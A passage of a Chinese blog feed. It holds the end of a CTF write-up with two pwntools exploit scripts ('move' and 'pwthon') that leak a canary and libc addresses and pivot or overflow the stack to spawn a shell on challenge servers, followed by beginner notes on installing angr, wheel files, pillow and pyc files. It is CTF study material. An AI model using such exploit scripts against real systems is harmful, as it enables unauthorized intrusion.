class="string">&quot;OmyGods\\&quot;</span></span><br><span class="line">save_path = <span class="string">&#x27;.\\&#x27;</span></span><br><span class="line"> </span><br><span class="line">im = Image.new(<span class="string">&#x27;RGBA&#x27;</span>,(<span class="number">2</span>*<span class="number">201</span>,<span class="number">600</span>))</span><br><span class="line"> </span><br><span class="line">imagefile = []</span><br><span class="line">width = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">201</span>):</span><br><span class="line">imagefile.append(Image.<span class="built_in">open</span>(path+<span class="string">&#x27;Frame&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.png&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> imagefile:</span><br><span class="line">im.paste(image,(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>))</span><br><span class="line">width = width +<span class="number">2</span></span><br><span class="line">im.save(save_path+<span class="string">&#x27;OmyGod.png&#x27;</span>)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure></div><hr><hr><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="move"><a href="#move" class="headerlink" title="move"></a>move</h2><p>栈迁移的知识，没看懂什么原理</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = remote(&#x27;47.93.188.210&#x27;, 40848)</span></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">b&#x27;lets travel again!\n&#x27;</span>, flat([<span class="number">0x405f00</span>, <span class="number">0x40121A</span>, <span class="number">0</span>, <span class="number">0</span>]))</span><br><span class="line">sh.sendafter(<span class="string">b&#x27;setp number&#x27;</span>, p32(<span class="number">0x12345678</span>))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">b&#x27;TaiCooLa&#x27;</span>, cyclic(<span class="number">48</span>) + flat([<span class="number">0x4050A0</span>, <span class="number">0x40124b</span>]))</span><br><span class="line">sh.sendafter(<span class="string">b&#x27;TaiCooLa&#x27;</span>, flat([<span class="number">0x405e00</span>, <span class="number">0x401353</span>, <span class="number">0x404018</span>, <span class="number">0x401080</span>, <span class="number">0x40121A</span>, <span class="number">0</span>, <span class="number">0x405ed0</span>, <span class="number">0x000000000040124b</span>]))</span><br><span class="line">libc_addr = u64(sh.recvn(<span class="number">6</span>) + <span class="string">b&#x27;\0\0&#x27;</span>) - <span class="number">0x80970</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sh.sendafter(<span class="string">b&#x27;TaiCooLa&#x27;</span>, flat([<span class="number">0x405d00</span>, libc_addr + <span class="number">0x4f302</span>, <span class="number">0x404018</span>, <span class="number">0x401080</span>, <span class="number">0x40121A</span>, <span class="number">0</span>, <span class="number">0x405dd0</span>, <span class="number">0x000000000040124b</span>]))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a><strong>pwthon</strong></h2><p>通过测试找到触发漏洞的PoC：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sh = remote(attach_host, 9541)</span><br><span class="line">sh.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, b<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sh.send(b<span class="string">&#x27;0&#x27;</span> * 0x100 + b<span class="string">&#x27;1&#x27;</span> * 0x180)</span><br><span class="line">sh.recvuntil(b<span class="string">&#x27;gift &#x27;</span>)</span><br><span class="line">app_addr = int(sh.recvline(), 16) - 0x68b0</span><br><span class="line">success(<span class="string">&#x27;app_addr: &#x27;</span> + hex(app_addr))</span><br></pre></td></tr></table></figure></div><p>根据Poc编写利用脚本：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;101.201.35.76&#x27;</span>, <span class="number">45057</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">b&#x27;0&#x27;</span> * <span class="number">0xd9</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;0&#x27;</span> * <span class="number">0xd9</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\0&#x27;</span> + sh.recvn(<span class="number">7</span>))</span><br><span class="line">success(<span class="string">&#x27;canary: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">sh.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;2&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;2&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">libc_addr = u64(sh.recvn(<span class="number">6</span>) + <span class="string">b&#x27;\0\0&#x27;</span>) - <span class="number">0x4473b0</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sh.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;1234&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;gift &#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;1234&#x27;</span>)</span><br><span class="line">sh.send(cyclic(<span class="number">264</span>) + flat([canary, <span class="number">0</span>, libc_addr + <span class="number">0x4f302</span>]) + <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="ctf_Replay" scheme="https://juana-2u.github.io/tags/ctf-Replay/"/>
    
  </entry>
  
  <entry>
    <title>About【python】</title>
    <link href="https://juana-2u.github.io/2023/10/14/About%E3%80%90python%E3%80%91/"/>
    <id>https://juana-2u.github.io/2023/10/14/About%E3%80%90python%E3%80%91/</id>
    <published>2023-10-14T04:19:57.000Z</published>
    <updated>2023-10-14T06:50:20.851Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="【Python】Installing-Angr-附wheel-file"><a href="#【Python】Installing-Angr-附wheel-file" class="headerlink" title="【Python】Installing Angr(附wheel file)"></a>【Python】Installing Angr(附wheel file)</h1><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668481279446-68beecfd-1d40-4973-838d-004f6f4fedaa.png"                      alt="img"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668481315041-5fa95728-5491-4348-ae39-ee96640827b2.png"                      alt="img"                ></p><p>原文的地址：<a class="link"   href="https://github.com/bannsec/angr-Windows" >https://github.com/bannsec/angr-Windows <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>在之前就安装好了的z3的基础上， 所以搞这个东西也是蛮快的</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Owlz/angr-Windows.git</span><br><span class="line">cd angr-Windows</span><br><span class="line">pip install virtualenv</span><br><span class="line">virtualenv --python=C:\Python2<span class="number">.7</span>-64bit\python.exe angr</span><br><span class="line">angr\Scripts\activate</span><br><span class="line">pip install &lt;capstone&gt;</span><br><span class="line">pip install &lt;z3&gt;</span><br><span class="line">pip install &lt;pyvex&gt;</span><br><span class="line">pip install angr</span><br></pre></td></tr></table></figure></div><p>分解步骤一步一步来</p><h3 id="1-git安装"><a href="#1-git安装" class="headerlink" title="1.git安装"></a>1.git安装</h3><p>（这一步是蛮简单的，打开到相应的目录下进行命令行的输入，之前git环境G掉了了，也不知道这个是怎么好的，大概是代理的原因）</p><p>先是在原来的C:&#x2F;&#x2F;python36的根目录下，使用git的方式将安装包放入到目录中去（如下图示）</p><h3 id="2-cd-angr-Windows"><a href="#2-cd-angr-Windows" class="headerlink" title="2.cd angr-Windows"></a>2.cd angr-Windows</h3><p>打开到Angr-Windows文件下，可以看到的是目录下有很多的wheel files</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668482137615-964c25aa-4222-453d-a5c7-f433fe92339a.png"                      alt="img"                ></p><h4 id="wheel-files的简介："><a href="#wheel-files的简介：" class="headerlink" title="wheel files的简介："></a>wheel files的简介：</h4><p>wheel files（.whl文件）也叫轮子（wheel）， 用于python分发(distribution)的标准内置包格式(standard built-package format)，包含安装所需的所有文件和元数据(metadata)。.whl文件使用的是zip压缩 .whl文件还包含有关此wheel文件支持的Python版本和平台的信息。.whl文件格式是一种即装即用格式(ready-to-install format)，允许在不构建源代码分发(without building the source distribution)的情况下运行安装包。  </p><h4 id="命名格式："><a href="#命名格式：" class="headerlink" title="命名格式："></a>命名格式：</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;dist&#125;-&#123;version&#125;(-&#123;build&#125;)?-&#123;python.version&#125;-&#123;abi&#125;-&#123;platform&#125;.whl  </span><br></pre></td></tr></table></figure></div><p>可以通过pip安装已经下载的.whl文件， <code>pip install &lt;filename&gt;.whl</code>  </p><h4 id="wheel的类型："><a href="#wheel的类型：" class="headerlink" title="wheel的类型："></a>wheel的类型：</h4><p>1)<code>.universal wheel</code>：包含了<code>py2.py3-none-any.whl</code> 任何操作系统和平台上都支持python2和python3</p><p>2)<code>.pure-python wheel</code>：包含<code>py3-none-any.whl</code>或<code>py2-none-any.whl</code>，但不能同时支持两者，在其它方面与universal wheel相同，但它会被标记为py2或py3而不是py2.py3标签。  </p><p>3)<code>.platform wheel</code>： 支持特定的Python版本和平台。  </p><h4 id="创建wheel"><a href="#创建wheel" class="headerlink" title="创建wheel"></a>创建wheel</h4><p>1).将所有模块(python脚本)、包(包含模块的文件夹&#x2F;目录)保存在父目录中。随意命名根目录，通常与项目相关  </p><p>2).最好创建一个空的名为__init__.py文件，并将此__init__.py文件放在所有包目录和子包目录下。无需将其保存在根目录中。</p><p>3).创建一个名为setup.py的文件并将其放在根目录中。此脚本的内容至少应包括：<code>distribution name, version number, and list of package names</code>  </p><p>4）转到运行python和pip命令的命令提示符，在提示符下更改目录并导航到放置setup.py的项目的根目录，执行下列命令( 扩展名为.whl的文件将在根目录下自动创建的子目录中创建，名为dist)</p><p> 注：需提取安装wheel setuptools: <code>pip install wheel setuptools</code>，在conda中默认是安装的  </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python setup.py bdist_wheel --universal # universal wheel</span><br><span class="line">python setup.py bdist_wheel # pure-Python wheel</span><br></pre></td></tr></table></figure></div><p>这里通过conda在虚拟环境base下创建一个wheel，取名为testwheel目录组织结构如下所示：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483245944-b3a29601-763e-4b59-b12c-139cbb9c08dd.png"                      alt="img"                ></p><p>setup.py内容如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setuptools</span><br><span class="line"> setuptools.setup(</span><br><span class="line">     name=<span class="string">&quot;testwheel&quot;</span>,</span><br><span class="line">     version=<span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">     author=<span class="string">&quot;fengbingchun&quot;</span>,</span><br><span class="line">     author_email=<span class="string">&quot;fengbingchun@163.com&quot;</span>,</span><br><span class="line">     description=<span class="string">&quot;test wheel&quot;</span>,</span><br><span class="line">     packages=setuptools.find_packages(),</span><br><span class="line">     url=<span class="string">&quot;https://github.com/fengbingchun&quot;</span>,</span><br><span class="line">     license=<span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">     python_requires=<span class="string">&quot;&gt;=3.8&quot;</span></span><br><span class="line"> )</span><br></pre></td></tr></table></figure></div><p>testwheel目录下的__init__.py是个空文件，math目录下的__init__.py内容如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from .math_add import * </span><br><span class="line">from .math_sub import *</span><br></pre></td></tr></table></figure></div><p>math_add.py内容如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add3</span>(<span class="params">a, b, c</span>):</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;call add operation: three parameters ...&quot;</span>)</span><br><span class="line">     <span class="keyword">return</span> (a+b+c)</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">a, b</span>):</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;call add operation: two parameters ...&quot;</span>)</span><br><span class="line">     <span class="keyword">return</span> (a+b)</span><br></pre></td></tr></table></figure></div><p>math_sub.py内容如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sub3</span>(<span class="params">a, b, c</span>):</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;call sub operation: three parameters ...&quot;</span>)</span><br><span class="line">     <span class="keyword">return</span> (a-b-c)</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">sub2</span>(<span class="params">a, b</span>):</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;call sub operation: two parameters ...&quot;</span>)</span><br><span class="line">     <span class="keyword">return</span> (a-b)</span><br></pre></td></tr></table></figure></div><p>执行如下命令生成wheel，此wheel仅限于在Python3上执行，将终端定位到setup.py目录下</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483246512-601d5977-29fc-481d-a44d-faec8e7e058a.png"                      alt="img"                ></p><p>执行完上述命令后会产生3个新的目录，build, dist, testwhell.egg-info，各个目录的内容如下所示，生成的whell在dist目录下，全名为<code>testwheel-1.0.0-py3-none-any.whl</code>，只需将此文件分发出去，其他人安装后即能使用。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483246129-6ea9ac80-1a61-4380-90dd-0728a6532dc7.png"                      alt="img"                ></p><h4 id="导入使用wheel"><a href="#导入使用wheel" class="headerlink" title="导入使用wheel"></a>导入使用wheel</h4><p>如果你想在项目中安装已经安装过的wheel文件，需要更新此wheel的版本号。如果版本号保持不变，pip将不会安装它。或者先卸载已安装的whell: <code>pip uninstall testwheel</code></p><p>通过conda新建一个虚拟环境testwheel，用来测试上面生成的<code>testwheel-1.0.0-py3-none-any.whl</code>，将终端定位到其它的test目录下，并将生成的wheel文件拷贝到此目录下，安装，执行结果如下图所示：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483245821-796976e4-e5c0-4f9e-8b6d-bc2d4ca20162.png"                      alt="img"                ></p><p>会将此wheel安装到<code>anaconda3/envs/testwheel/lib/python3.8/site-packages/</code>目录下，如下图所示：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483246029-22fefc10-c2a4-4074-b851-22c394ccc995.png"                      alt="img"                ></p><p>在tmp下添加一个test.py文件，用于测试wheel，内容如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> testwheel.math <span class="keyword">import</span> math_add, math_sub</span><br><span class="line"> a, b, c = <span class="number">10</span>, <span class="number">5</span>, <span class="number">2</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;add3:&quot;</span>, math_add.add3(a, b, c))</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;add2:&quot;</span>, math_add.add2(a, b))</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;sub3:&quot;</span>, math_sub.sub3(a, b, c))</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;sub2:&quot;</span>, math_sub.sub2(a, b))</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;test finish&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>执行结果如下所示：可见正确的调用了wheel中的接口</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483246661-6906691a-5bf2-44e9-8e60-5346021c3c52.png"                      alt="img"                ></p><p>如果需要反复的调整wheel的内容，需要反复的测试，又不想修改version number，一种方法是可先卸载已安装的wheel，然后再次安装新的wheel，如下图所示：也可使用–force-reinstall</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483247066-b4fa1486-6ad1-49d3-b00e-e99e8cba64e8.png"                      alt="img"                ></p><h3 id="3-pip-install-virtualenv"><a href="#3-pip-install-virtualenv" class="headerlink" title="3.pip install virtualenv"></a>3.pip install virtualenv</h3><p>安装的是一个python的虚拟环境</p><p>之后设置指向的python.exe文件<code>virtualenv --python=C:\Python36\python.exe angr</code></p><p>进入虚拟环境后<code>angr\Scripts\activate</code>进入到这个文件内，将这个原来是在angr-Windows文件夹下的C++filt.exe文件放在这个angr的文件下</p><p>Then move the “c++filt” executable into your angr&#x2F;Scripts directory. And yes, the order matters somewhat. Primarily I think capstone needs to be installed first, then the other wheel files in any order. Make sure you install the wheel files prior to attempting to install angr proper.</p><p>根据这个原文中的内容，要先使用pip安装好capstone</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483785133-b878f895-361e-4e33-b243-97264c201cb4.png"                      alt="img"                ></p><p>安装好了之后，就直接按照这个顺序安装z3</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483823250-5c39e1c2-1202-4e7b-ad2b-f0fffc2e09b4.png"                      alt="img"                ></p><p>接着pyvex</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483864656-e8a7892e-0f27-4319-983b-f072a9980528.png"                      alt="img"                ></p><p>最后要好长时间来安装angr</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483896069-0edfa943-7b1c-4b5b-bc5b-ef79ef763400.png"                      alt="img"                ></p><h3 id="4-验证一下angr是否能够使用"><a href="#4-验证一下angr是否能够使用" class="headerlink" title="4.验证一下angr是否能够使用"></a>4.验证一下angr是否能够使用</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1668483976296-07828cf1-ed56-4abe-9902-9e7916dbbf6c.png"                      alt="img"                ></p><p>太棒了，没有像之前一样报错。</p><h1 id="【python】安装pillow的三种方法"><a href="#【python】安装pillow的三种方法" class="headerlink" title="【python】安装pillow的三种方法"></a>【python】安装pillow的三种方法</h1><p>pillow是python的图形界面库</p><h2 id="M1-pip："><a href="#M1-pip：" class="headerlink" title="M1 pip："></a>M1 pip：</h2><p>在Dos界面输入命令：<code>pip install pillow</code></p><h2 id="M2-download-wheel-file："><a href="#M2-download-wheel-file：" class="headerlink" title="M2 download wheel file："></a>M2 download wheel file：</h2><p>wheel源文件下载安装官网 <a class="link"   href="https://pypi.org/" >https://pypi.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>找到对应的版本下载</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1671292678431-684e2cd6-36e3-4b0b-bab2-3ad4534b3693.png"                                     ></p><p>在pyhon目录下Dos界面输入命令：<code>pip install &lt;name&gt;.amd64.whl</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1671292746202-02549763-d054-4c64-b958-bbd28cf24dbf.png"                      alt="img"                ></p><h2 id="M3-pip-with-doubanio："><a href="#M3-pip-with-doubanio：" class="headerlink" title="M3 pip with doubanio："></a>M3 pip with doubanio：</h2><p>使用豆瓣提供的源</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https://pypi.doubanio.com/simple/ --trusted-host pypi.doubanio.com pillow</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1671292883344-f9e8831a-a0b6-4e72-9a3d-43ba81f212e9.png"                      alt="img"                ></p><p>记录一下 </p><h1 id="【python】常用方法"><a href="#【python】常用方法" class="headerlink" title="【python】常用方法"></a>【python】常用方法</h1><h2 id="python逆序："><a href="#python逆序：" class="headerlink" title="python逆序："></a>python逆序：</h2><p><code>enc=&quot;ScDZC1cNDZaxnh/2eW1UdqaCiJ0ijRIExlvVEgP43rpxoxbYePBhpwHDPJ==&quot;</code></p><p><code>print(enc[::-1])</code></p><h2 id="python将字母转换成大写字母"><a href="#python将字母转换成大写字母" class="headerlink" title="python将字母转换成大写字母"></a>python将字母转换成大写字母</h2><p>三种方法upper() capitalize() title()</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;www.php.com&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.upper())         <span class="comment"># 把所有字符中的小写字母转换成大写字母</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.lower())         <span class="comment"># 把所有字符中的大写字母转换成小写字母</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.capitalize())      <span class="comment"># 把第一个字母转化为大写字母，其余小写</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.title())          <span class="comment"># 把每个单词的第一个字母转化为大写，其余小写</span></span><br><span class="line">WWW.PHP.COM</span><br><span class="line">www.php.com</span><br><span class="line">Www.php.com</span><br><span class="line">Www.Php.Com</span><br></pre></td></tr></table></figure></div><h1 id="【python】利用setup-py安装"><a href="#【python】利用setup-py安装" class="headerlink" title="【python】利用setup.py安装"></a>【python】利用setup.py安装</h1><p>在安装secret的python模块包遇到的问题</p><p>直接下载安装包</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1677404041227-2f0e2fb2-865a-4de1-9ab4-a513a5094a05.png"                      alt="img"                ></p><p>打开之后有setup.py文件</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1677404343880-3d4a56dc-79e4-4374-9b74-b4374242c5eb.png"                      alt="img"                ></p><p>在该目录下，cmd输入</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.python setup.py build</span><br><span class="line">2.python setup.py install  </span><br></pre></td></tr></table></figure></div><h1 id="【Python】有关pyc文件介绍及逆向"><a href="#【Python】有关pyc文件介绍及逆向" class="headerlink" title="【Python】有关pyc文件介绍及逆向"></a>【Python】有关pyc文件介绍及逆向</h1><h1 id="pyc文件是什么"><a href="#pyc文件是什么" class="headerlink" title="pyc文件是什么"></a>pyc文件是什么</h1><p>pyc是一种二进制文件，是由Python文件经过编译后所生成的文件，它是一种byte code（字节码），可由python虚拟机直接执行。</p><p>py文件编译成pyc文件后加载速度更快而且提高了代码的安全性。pyc的内容与python的版本相关，不同版本编译的pyc文件不一样</p><p><strong>py文件速生成pyc文件</strong></p><p><strong>python -m py_compile 1.py</strong></p><h1 id="pyc文件有什么用"><a href="#pyc文件有什么用" class="headerlink" title="pyc文件有什么用"></a>pyc文件有什么用</h1><p>py文件是可以直接看见python源码的，由于不可能把源码泄露，所以我们就需要将原来的py文件编译成pyc文件来保护源码。</p><p>另外生成的pyc文件时可以进行反编译的，然而不同版本编译后的pyc文件是不一样的，这主要是根据Python源码中所提供的opcode来决定。</p><h1 id="pyc文件怎么生成"><a href="#pyc文件怎么生成" class="headerlink" title="pyc文件怎么生成"></a>pyc文件怎么生成</h1><h2 id="单个pyc文件的生成"><a href="#单个pyc文件的生成" class="headerlink" title="单个pyc文件的生成"></a>单个pyc文件的生成</h2><ul><li><strong>命令行的生成</strong><code>**python -m py_compile 1.py**</code></li><li><strong>代码实现</strong><code>**import py_compile**   </code></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**py_compile.compile(r&#x27;H:/game/test.py&#x27;)**</span><br></pre></td></tr></table></figure></div><p><strong>compile()函数的语法:</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile(file[, cfile[, dfile[, doraise]]])</span><br></pre></td></tr></table></figure></div><p>file ：表示需要编译的py文件的路径</p><p>cfile ：表示编译后的pyc文件名称和路径，默认为直接在file文件名后加c 或者 o,（o表示优化的字节码）</p><p>dfile：指的是错误消息保存的路径</p><p>doraise ：有两个值分别是true或false</p><p>​     如果为true时则会引发一个PyCompileError，否则如果编译文件出错，则会有一个错误，默认显示在sys.stderr中，而不会引发异常</p><h2 id="批量生成pyc文件"><a href="#批量生成pyc文件" class="headerlink" 